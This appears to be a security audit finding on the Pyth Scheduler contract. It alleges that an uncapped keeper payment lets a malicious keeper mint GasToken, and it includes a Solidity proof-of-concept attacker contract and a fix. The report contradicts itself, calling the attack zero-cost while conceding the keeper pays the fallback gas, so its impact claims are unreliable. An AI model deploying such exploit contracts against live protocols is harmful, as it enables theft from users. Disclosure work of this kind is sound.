### Title
Unbounded Push-Payment to Keeper Enables GasToken Minting at Zero Net Cost - (File: `target_chains/ethereum/contracts/contracts/pulse/Scheduler.sol`)

---

### Summary

`Scheduler._processFeesAndPayKeeper` pays the keeper via an uncapped `call{value: totalKeeperFee}("")`. The gas-cost snapshot is taken **before** this call, so any gas consumed inside the keeper's `receive()` fallback is invisible to the fee calculation. A malicious keeper contract can mint GasToken (or perform any other gas-intensive side-effect) inside that fallback at zero net cost, because the subscription already reimbursed the keeper for all gas up to the transfer point.

---

### Finding Description

`updatePriceFeeds` is permissionless — any address may act as keeper. At the end of a successful update it calls:

```solidity
// Scheduler.sol L846
uint256 gasCost = (startGas - gasleft() + GAS_OVERHEAD) * tx.gasprice;
```

`gasleft()` is sampled here, **before** the ETH transfer. Then:

```solidity
// Scheduler.sol L860
(bool sent, ) = msg.sender.call{value: totalKeeperFee}("");
```

No gas cap is placed on this call. Under EIP-150 the callee receives up to 63/64 of the remaining gas. Any work performed inside the keeper's `receive()` function — including minting GasToken (GST2 / CHI) by writing and then clearing storage slots — is entirely outside the `gasCost` window. The subscription is charged only `totalKeeperFee`; the keeper pays the marginal gas for the fallback but recoups it (and more) through the GasToken refund.

The identical structural flaw exists in `Echo.withdrawAsFeeManager` (line 375) and `Entropy.withdraw` / `Entropy.withdrawAsFeeManager` (lines 163, 199), though those are pull-style withdrawals where the caller is already the beneficiary and the gas-refund incentive is the same.

---

### Impact Explanation

- A keeper operating as a contract can mint GasToken on every `updatePriceFeeds` call, subsidising all future gas costs on the same chain.
- On EVM-compatible chains that have not adopted EIP-3529 (many L2s and alt-EVMs where Pyth is deployed), storage-refund GasToken schemes remain fully effective.
- The subscription balance is drained at the correct rate, but the keeper extracts an additional off-book profit stream that was not intended by the protocol, distorting the keeper market and potentially enabling a single actor to outcompete honest keepers indefinitely.
- If the keeper's `receive()` function reverts (e.g., intentional griefing), the entire `updatePriceFeeds` call reverts, allowing a malicious keeper to selectively block subscription updates while paying only the transaction base fee.

---

### Likelihood Explanation

- `updatePriceFeeds` has no access control; any EOA or contract may call it.
- Deploying a keeper contract with a GasToken-minting `receive()` is a well-documented technique requiring no privileged access.
- The economic incentive is clear: on chains where GasToken is viable, the keeper earns the normal fee **plus** free GasToken on every update cycle.

---

### Recommendation

Replace the uncapped push-payment with a pull-payment pattern: record the owed amount in a mapping and let the keeper withdraw separately. If push-payment must be retained, cap the forwarded gas to the standard 2 300-gas stipend:

```solidity
(bool sent, ) = msg.sender.call{value: totalKeeperFee, gas: 2300}("");
```

This prevents any meaningful computation inside the fallback while still allowing plain-ETH receipt.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGasToken {
    function mint(uint256 value) external;
}

interface IScheduler {
    function updatePriceFeeds(uint256 subscriptionId, bytes[] calldata updateData) external;
}

contract MaliciousKeeper {
    IGasToken constant CHI = IGasToken(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c);
    IScheduler immutable scheduler;

    constructor(address _scheduler) { scheduler = IScheduler(_scheduler); }

    // Step 1: call updatePriceFeeds with valid update data
    function triggerUpdate(uint256 subId, bytes[] calldata data) external {
        scheduler.updatePriceFeeds(subId, data);
    }

    // Step 2: when Scheduler pushes totalKeeperFee here with no gas cap,
    // mint GasToken using the forwarded gas — cost is NOT in gasCost snapshot
    receive() external payable {
        uint256 gasToUse = gasleft() - 5000; // leave buffer for return
        CHI.mint(gasToUse / 14154);          // ~14 154 gas per CHI token
    }
}
```

1. Deploy `MaliciousKeeper` pointing at the Scheduler.
2. Call `triggerUpdate` with a valid price update satisfying the subscription's criteria.
3. `_processFeesAndPayKeeper` snapshots `gasleft()` at line 846, computes `gasCost`, then calls `msg.sender.call{value: totalKeeperFee}("")` at line 860 with no gas cap.
4. `receive()` executes with ~63/64 of remaining gas and mints CHI tokens.
5. The subscription is charged the correct `totalKeeperFee`; the keeper additionally holds freshly minted CHI redeemable for future gas refunds. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** target_chains/ethereum/contracts/contracts/pulse/Scheduler.sol (L275-348)
```text
    function updatePriceFeeds(
        uint256 subscriptionId,
        bytes[] calldata updateData
    ) external override {
        uint256 startGas = gasleft();

        SchedulerStructs.SubscriptionStatus storage status = _state
            .subscriptionStatuses[subscriptionId];
        SchedulerStructs.SubscriptionParams storage params = _state
            .subscriptionParams[subscriptionId];

        if (!params.isActive) {
            revert SchedulerErrors.InactiveSubscription();
        }

        // Get the Pyth contract and parse price updates
        IPyth pyth = IPyth(_state.pyth);
        uint256 pythFee = pyth.getUpdateFee(updateData);

        // If we don't have enough balance, revert
        if (status.balanceInWei < pythFee) {
            revert SchedulerErrors.InsufficientBalance();
        }

        // Parse the price feed updates with an acceptable timestamp range of [0, now+10s].
        // Note: We don't want to reject update data if it contains a price
        // from a market that closed a few days ago, since it will contain a timestamp
        // from the last trading period. Thus, we use a minimum timestamp of zero while parsing,
        // and we enforce the past max validity ourselves in _validateShouldUpdatePrices using
        // the highest timestamp in the update data.
        status.balanceInWei -= pythFee;
        status.totalSpent += pythFee;
        uint64 curTime = SafeCast.toUint64(block.timestamp);
        (
            PythStructs.PriceFeed[] memory priceFeeds,
            uint64[] memory slots
        ) = pyth.parsePriceFeedUpdatesWithConfig{value: pythFee}(
                updateData,
                params.priceIds,
                0, // We enforce the past max validity ourselves in _validateShouldUpdatePrices
                curTime + FUTURE_TIMESTAMP_MAX_VALIDITY_PERIOD,
                false,
                true,
                false
            );

        // Verify all price feeds have the same Pythnet slot.
        // All feeds in a subscription must be updated at the same time.
        uint64 slot = slots[0];
        for (uint8 i = 1; i < slots.length; i++) {
            if (slots[i] != slot) {
                revert SchedulerErrors.PriceSlotMismatch();
            }
        }

        // Verify that update conditions are met, and that the timestamp
        // is more recent than latest stored update's. Reverts if not.
        uint256 latestPublishTime = _validateShouldUpdatePrices(
            subscriptionId,
            params,
            status,
            priceFeeds
        );

        // Update status and store the updates
        status.priceLastUpdatedAt = latestPublishTime;
        status.totalUpdates += priceFeeds.length;

        _storePriceUpdates(subscriptionId, priceFeeds);

        _processFeesAndPayKeeper(status, startGas, params.priceIds.length);

        emit PricesUpdated(subscriptionId, latestPublishTime);
    }
```

**File:** target_chains/ethereum/contracts/contracts/pulse/Scheduler.sol (L840-864)
```text
    function _processFeesAndPayKeeper(
        SchedulerStructs.SubscriptionStatus storage status,
        uint256 startGas,
        uint256 numPriceIds
    ) internal {
        // Calculate fee components
        uint256 gasCost = (startGas - gasleft() + GAS_OVERHEAD) * tx.gasprice;
        uint256 keeperSpecificFee = uint256(_state.singleUpdateKeeperFeeInWei) *
            numPriceIds;
        uint256 totalKeeperFee = gasCost + keeperSpecificFee;

        // Check balance
        if (status.balanceInWei < totalKeeperFee) {
            revert SchedulerErrors.InsufficientBalance();
        }

        status.balanceInWei -= totalKeeperFee;
        status.totalSpent += totalKeeperFee;

        // Pay keeper and update status
        (bool sent, ) = msg.sender.call{value: totalKeeperFee}("");
        if (!sent) {
            revert SchedulerErrors.KeeperPaymentFailed();
        }
    }
```
